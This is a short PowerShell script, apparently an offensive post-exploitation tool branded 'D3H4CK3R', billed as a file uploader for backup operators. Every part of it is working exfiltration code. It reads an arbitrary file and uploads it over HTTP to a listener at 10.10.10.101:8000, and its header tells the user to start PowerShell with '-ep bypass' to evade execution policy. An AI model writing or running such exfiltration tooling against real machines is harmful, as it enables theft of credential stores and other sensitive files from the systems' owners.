<#
 ┓      ┓       ┓  ┓   
┏┫┏┓┓┏┏┓┃┏┓┏┓┏┓┏┫  ┣┓┓┏
┗┻┗ ┗┛┗ ┗┗┛┣┛┗ ┗┻  ┗┛┗┫
           ┛          ┛
┳┓┏┓┓┏┏┓┏┓┓┏┓          
┃┃ ┫┣┫┣┫┃ ┃┫           
┻┛┗┛┛┗┛┗┗┛┛┗┛  

Simple File uploader designed for backup operators
Change $Server ip address to linux ip address before using that script
Before using this script start powershell with "powershell -ep bypass"

#>

param(
    [string]$Server = "10.10.10.101",
    [int]$Port = 8000,
    [string]$FilePath
)

if (-not $FilePath) {
    Write-Host "Usage: .\Sec_BackupOperator_Client.ps1 -FilePath 'C:\where\is\your\file.exe'" -ForegroundColor Yellow
    exit
}

if (-not (Test-Path $FilePath)) {
    Write-Error "File not found: $FilePath"
    exit
}

$fileName = [System.IO.Path]::GetFileName($FilePath)
$fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
$uri = "http://${Server}:${Port}/upload"

Write-Host "[*] Uploading $fileName ($($fileBytes.Length) bytes) to $uri" -ForegroundColor Cyan

try {
    $webClient = New-Object System.Net.WebClient
    $response = $webClient.UploadData($uri, "POST", $fileBytes)
    $responseText = [System.Text.Encoding]::UTF8.GetString($response)
    Write-Host "[+] Upload successful!" -ForegroundColor Green
    Write-Host "    Response: $responseText" -ForegroundColor Yellow
} catch {
    Write-Host "[-] Upload failed: $($_.Exception.Message)" -ForegroundColor Red
    Write-Host "[*] Troubleshooting steps:" -ForegroundColor Yellow
    Write-Host "    1. Check if Ubuntu server is running: python3 Sec_BackupOperator_Server.py" -ForegroundColor Yellow
    Write-Host "    2. Check firewall: sudo ufw allow 8000" -ForegroundColor Yellow
    Write-Host "    3. Verify IP address connectivity" -ForegroundColor Yellow
}